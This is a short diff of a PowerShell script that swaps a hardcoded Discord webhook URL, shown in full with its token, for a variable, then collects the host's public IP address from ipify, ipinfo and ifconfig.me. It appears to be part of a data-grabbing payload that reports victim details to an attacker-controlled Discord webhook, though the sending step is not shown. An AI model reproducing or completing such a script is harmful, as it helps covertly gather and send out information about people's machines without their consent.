@@ -1,4 +1,4 @@
-$url = "https://discord.com/api/webhooks/1060451832108949596/-doca_q-YfvU_TZ1feEwZ3QuatUBCPnaQx1UW95kVkQ3_7QpmiidEzXoceBJ6oHr-KCZ";
+$url = "$dc";
 $AddressUsingIpify = (Invoke-WebRequest -uri "https://api.ipify.org/").Content;
 $AddressUsingIpInfo = Invoke-WebRequest -uri "https://ipinfo.io/ip";
 $AddressUsingIfconfig = Invoke-WebRequest -uri "https://ifconfig.me/ip";
